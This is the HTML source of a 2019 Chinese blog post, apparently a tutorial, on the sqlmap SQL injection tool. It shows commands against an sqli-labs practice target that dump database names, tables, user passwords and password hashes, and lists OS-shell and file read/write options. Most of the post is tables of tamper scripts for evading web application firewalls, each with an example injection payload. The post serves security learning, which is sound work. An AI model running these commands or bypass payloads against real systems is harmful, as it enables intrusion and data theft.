@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>SQLMap使用 | Joner的博客</title>
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class="SideBar">
+    <section class="avatar" style="background-image: url()">
+        <div class="av-pic" style="background-image: url()">
+        </div>
+    </section>
+    <section class="menu">
+        <div>Joner的博客</div>
+        
+            <div>通透</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class="ContentView">
+    <header class="PageTitle">
+        <h1>SQLMap使用</h1>
+    </header>
+
+    <section>
+      <p>SQLMap是一个自动化的SQL注入工具，它的主要功能是扫描，内置了很多绕过插件，支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP Max DB。其强大功能有数据库指纹识别、数据库枚举、数据提取、访问目标文件系统。</p>
+<a id="more"></a>
+<h3 id="SQLMap入门"><a href="#SQLMap入门" class="headerlink" title="SQLMap入门"></a>SQLMap入门</h3><p>这里以sql–labs Less-1为例，介绍sqlmap的基本使用方法</p>
+<h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+<p>结果如下所示</p>
+<p><img src="/2019/04/08/SQLMap使用/D:/Entertainment\STU\Bolg\source\_posts\SQLMap使用\1.png" alt></p>
+<p>可以看到检测到了系统、数据库、php的信息，上面还有注入点信息以及相应的payload</p>
+<h4 id="判断文本种的请求是否存在注入"><a href="#判断文本种的请求是否存在注入" class="headerlink" title="判断文本种的请求是否存在注入"></a>判断文本种的请求是否存在注入</h4><p>SQLMap可以加载文件中的HTTP请求，这样就不用手动设置其他参数，</p>
+<h4 id="查询数据库中的信息"><a href="#查询数据库中的信息" class="headerlink" title="查询数据库中的信息"></a>查询数据库中的信息</h4><p>查询所有数据库<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --dbs</code></p>
+<p>获取数据库中的表名<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security --tables</code></p>
+<p>获取表中的字段名<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security -T users --columns</code></p>
+<p>获取字段的内容<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 -D security -T users -C username,password --dump</code></p>
+<p>获取数据库用户的密码<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --passwords</code></p>
+<p>获取当前网站数据库的名称 <code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --current-db</code></p>
+<p>获取当前网站的用户名称<code>sqlmap.py -u http://43.247.91.228:84/Less-1/?id=1 --current-user</code></p>
+<h3 id="SQLMap进阶"><a href="#SQLMap进阶" class="headerlink" title="SQLMap进阶"></a>SQLMap进阶</h3><table>
+<thead>
+<tr>
+<th>功能</th>
+<th style="text-align:center">参数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>探测等级</td>
+<td style="text-align:center">–level    （一共有五个等级）</td>
+</tr>
+<tr>
+<td>当前用户是否为管理员权限</td>
+<td style="text-align:center">–is-dba</td>
+</tr>
+<tr>
+<td>列出数据库管理员角色</td>
+<td style="text-align:center">–roles</td>
+</tr>
+<tr>
+<td>HTTP Referer头</td>
+<td style="text-align:center">–referer</td>
+</tr>
+<tr>
+<td>运行自定义SQL语句</td>
+<td style="text-align:center">–sql-shell</td>
+</tr>
+<tr>
+<td>运行任意操作系统命令</td>
+<td style="text-align:center">–os-cmd,–os-shell</td>
+</tr>
+<tr>
+<td>从数据库服务器中读取文件</td>
+<td style="text-align:center">–file-read</td>
+</tr>
+<tr>
+<td>上传文件到数据库服务器中</td>
+<td style="text-align:center">–file-write –file-dest</td>
+</tr>
+</tbody>
+</table>
+<h3 id="SQLMap自带绕过脚本"><a href="#SQLMap自带绕过脚本" class="headerlink" title="SQLＭap自带绕过脚本"></a>SQLＭap自带绕过脚本</h3><h4 id="支持所有数据库的脚本"><a href="#支持所有数据库的脚本" class="headerlink" title="支持所有数据库的脚本"></a>支持所有数据库的脚本</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>apostrophemask.py</td>
+<td>用utf8代替引号</td>
+<td>(“1 AND ‘1’=’1”)  ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td>
+</tr>
+<tr>
+<td>base64encode.py</td>
+<td>用base64编码替换</td>
+<td>(“1’ AND SLEEP(5)#”)<br>‘MScgQU5EIFNMRUVQKDUpIw==’</td>
+</tr>
+<tr>
+<td>multiplespaces.py</td>
+<td>围绕SQL关键字添加多个空格</td>
+<td>(‘1 UNION SELECT foobar’)<br>‘1    UNION     SELECT   foobar’</td>
+</tr>
+<tr>
+<td>space2plus.py</td>
+<td>用+替换空格</td>
+<td>(‘SELECT id FROM users’)<br>‘SELECT+id+FROM+users’</td>
+</tr>
+<tr>
+<td>nonrecursivereplacement.py</td>
+<td>双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如  .replace（“SELECT”、””)） filters</td>
+<td>(‘1 UNION SELECT 2–’) ‘1 UNIOUNIONN SELESELECTCT 2–’</td>
+</tr>
+<tr>
+<td>space2randomblank.py</td>
+<td>代替空格字符（“”）从一个随机的空 白字符可选字符的有效集</td>
+<td>(‘SELECT id FROM users’) ‘SELECT%0Did%0DFROM%0Ausers’</td>
+</tr>
+<tr>
+<td>unionalltounion.py</td>
+<td>替换UNION ALL SELECT UNION SELECT</td>
+<td>(‘-1 UNION ALL SELECT’)<br> ‘-1 UNION SELECT’</td>
+</tr>
+<tr>
+<td>securesphere.py</td>
+<td>追加特制的字符串</td>
+<td>(‘1 AND 1=1’) <br>“1 AND 1=1 and ‘0having’=’0having’”</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>space2hash.py</td>
+<td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
+<td>‘1 AND 9227=9227’<br>  ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td>
+</tr>
+<tr>
+<td>equaltolike.py</td>
+<td>like 代替等号</td>
+<td><em> Input: SELECT </em> FROM users WHERE id=1  2 <em> Output: SELECT </em> FROM users WHERE id LIKE 1</td>
+</tr>
+<tr>
+<td>space2mssqlblank.py(mssql)</td>
+<td>空格替换为其它空符号</td>
+<td>Input: SELECT id FROM users Output: SELECT%08id%02FROM%0Fusers</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>替换空格</td>
+<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td>asp允许每个字符前面添加一个%号</td>
+<td><em> Input: SELECT FIELD FROM TABLE </em> Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
+</tr>
+<tr>
+<td>sp_password.py</td>
+<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
+<td>(‘1 AND 9227=9227– ‘) ‘1 AND 9227=9227– sp_password’</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE <br></em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+<td><em> Input: INSERT <br></em> Output: InsERt</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>用‘/**/’ 替换空格</td>
+<td><em> Input: SELECT id FROM users<br> </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+</tbody>
+</table>
+<h4 id="mysql-gt-5-1-13"><a href="#mysql-gt-5-1-13" class="headerlink" title="mysql &gt;= 5.1.13"></a>mysql &gt;= 5.1.13</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>equaltolike.py</td>
+<td>like 代替等号</td>
+<td><em> Input: SELECT </em> FROM users WHERE id=1  <br> <em> Output: SELECT </em> FROM users WHERE id LIKE 1</td>
+</tr>
+<tr>
+<td>greatest.py</td>
+<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
+<td>(‘1 AND A &gt; B’) <br>‘1 AND GREATEST(A,B+1)=A’</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>绕过过滤双引号，替换字符和双引号。</td>
+<td>tamper(“1 AND ‘1’=’1”)  <br>‘1 AND %00%271%00%27=%00%271’</td>
+</tr>
+<tr>
+<td>ifnull2ifisnull.py</td>
+<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
+<td>(‘IFNULL(1, 2)’) <br>‘IF(ISNULL(1),2,1)’</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>替换空格</td>
+<td>(‘1 AND 9227=9227’) ‘1%23%0AAND%23%0A9227=9227’</td>
+</tr>
+<tr>
+<td>modsecurityversioned.py</td>
+<td>过滤空格，包含完整的查询版本注释</td>
+<td>(‘1 AND 2&gt;1–’)<br> ‘1 /<em>!30874AND 2&gt;1</em>/–’</td>
+</tr>
+<tr>
+<td>space2mysqlblank.py</td>
+<td>空格替换其它空白符号(mysql)</td>
+<td>Input: SELECT id FROM users <br>Output: SELECT%0Bid%0BFROM%A0users</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) <br>‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned.py</td>
+<td>包含了完整的查询与零版本注释</td>
+<td>(‘1 AND 2&gt;1–’) ‘1 /<em>!00000AND 2&gt;1</em>/–’</td>
+</tr>
+<tr>
+<td>space2mysqldash.py</td>
+<td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
+<td>(‘1 AND 9227=9227’)<br> ‘1–%0AAND–%0A9227=9227’</td>
+</tr>
+<tr>
+<td>bluecoat.py</td>
+<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</td>
+<td>(‘SELECT id FROM users where id = 1’) <br>‘SELECT%09id FROM users where id LIKE 1’</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td>asp允许每个字符前面添加一个%号</td>
+<td><em> Input: SELECT FIELD FROM TABLE <br></em> Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE <br></em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+<td><em> Input: INSERT <br></em> Output: InsERt</td>
+</tr>
+<tr>
+<td>versionedkeywords.py</td>
+<td>用版本化的MySQL注释将每个非函数关键字括起来</td>
+<td><code>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# * Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>用‘/**/’ 替代空格</td>
+<td><em> Input: SELECT id FROM users </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>versionedmorekeywords.py</td>
+<td>注释绕过</td>
+<td><em> `Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# </em> Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#`</td>
+</tr>
+</tbody>
+</table>
+<h4 id="MySQL-lt-5-1"><a href="#MySQL-lt-5-1" class="headerlink" title="MySQL &lt; 5.1"></a>MySQL &lt; 5.1</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>关键字前加注释</td>
+<td><em> Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa </em> Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>当数据库为mysql时绕过防火墙，每个关键字之前添加 mysql版本评论</td>
+<td><code>1.(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;) `</code>2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”`</td>
+</tr>
+</tbody>
+</table>
+<h4 id="MySQL-gt-5-1-13"><a href="#MySQL-gt-5-1-13" class="headerlink" title="MySQL &gt;= 5.1.13"></a>MySQL &gt;= 5.1.13</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>space2morehash.py</td>
+<td>空格替换为 #号 以及更多随机字符串 换行符</td>
+<td><em> Input: 1 AND 9227=9227 </em> Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>greatest.py</td>
+<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
+<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td>绕过过滤双引号，替换字符和双引号。</td>
+<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td>用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE </em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>随机大小写</td>
+<td><em> Input: INSERT </em> Output: InsERt</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>Replaces space character (‘ ‘) with comments ‘/**/’</td>
+<td><em> Input: SELECT id FROM users </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+</tbody>
+</table>
+<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th style="text-align:left">作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>greatest.py</td>
+<td style="text-align:left">绕过过滤’&gt;’ ,用GREATEST替换大于号</td>
+<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)=A’</td>
+</tr>
+<tr>
+<td>apostrophenullencode.py</td>
+<td style="text-align:left">绕过过滤双引号，替换字符和双引号。</td>
+<td>tamper(“1 AND ‘1’=’1”)  ‘1 AND %00%271%00%27=%00%271’</td>
+</tr>
+<tr>
+<td>between.py</td>
+<td style="text-align:left">用between替换大于号（&gt;）</td>
+<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td style="text-align:left">asp允许每个字符前面添加一个%号</td>
+<td><em> Input: SELECT FIELD FROM TABLE </em> Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td style="text-align:left">url编码</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE </em> Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td style="text-align:left">随机大小写</td>
+<td><em> Input: INSERT </em> Output: InsERt</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td style="text-align:left">字符串 unicode 编码</td>
+<td><em> Input: SELECT FIELD%20FROM TABLE </em> Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td style="text-align:left">Replaces space character (‘ ‘) with comments ‘/**/’</td>
+<td><em> Input: SELECT id FROM users </em> Output: SELECT//id//FROM/**/users</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h4><table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>appendnullbyte.py</td>
+<td>在有效负荷结束位置加载零字节字符编码</td>
+<td>(‘1 AND 1=1’) ‘1 AND 1=1%00’</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>脚本名称</th>
+<th>作用</th>
+<th>示例</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>chardoubleencode.py</td>
+<td>双url编码(不处理以编码的)</td>
+<td><em> Input: SELECT FIELD FROM%20TABLE <br></em> Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td>
+<td></td>
+</tr>
+<tr>
+<td>unmagicquotes.py</td>
+<td>宽字符绕过 GPC  addslashes</td>
+<td><em> Input: 1′ AND 1=1 <br></em> Output: 1%bf%27 AND 1=1–%20</td>
+<td><em> Input: 1′ AND 1=1 </em> Output: 1%bf%27 AND 1=1–%20</td>
+</tr>
+<tr>
+<td>randomcomments.py</td>
+<td>用/**/分割sql关键字</td>
+<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
+<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><a href="https://blog.csdn.net/whatday/article/details/54774043" target="_blank" rel="noopener">sqlmap –tamper 绕过WAF脚本分类整理</a></p>
+<p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357" target="_blank" rel="noopener">sqlmap的使用 —- 自带绕过脚本tamper</a></p>
+</blockquote>
+
+
+      
+
+    </section>
+    
+      <section class="ArticleMeta">
+          <div>
+            发布于&nbsp;
+            <time datetime="2019-04-08T12:47:22.000Z" itemprop="datePublished">
+              2019-04-08
+            </time>
+          </div>
+          
+            <div>
+              tags: 
+  <li class="meta-text">
+  { <a href="/tags/SQLMap/">SQLMap</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/工具使用/">工具使用</a> }
+  </li>
+
+
+            </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2019 - Joner </div>
+    <div>
+        <span>
+            Powered by <a href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
